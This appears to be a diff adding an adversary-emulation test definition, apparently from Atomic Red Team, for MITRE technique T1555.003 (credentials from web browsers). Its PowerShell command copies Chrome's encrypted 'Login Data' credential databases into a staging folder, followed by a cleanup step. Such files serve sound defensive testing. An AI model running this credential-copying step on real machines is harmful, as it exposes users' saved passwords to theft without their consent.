@@ -1,0 +1,31 @@
+{
+    "name": "Simulating access to Chrome Login Data",
+    "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database.  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
+        "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "3d111226-d09a-4911-8715-fe11664f960d",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Chrome must be installed\n",
+            "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
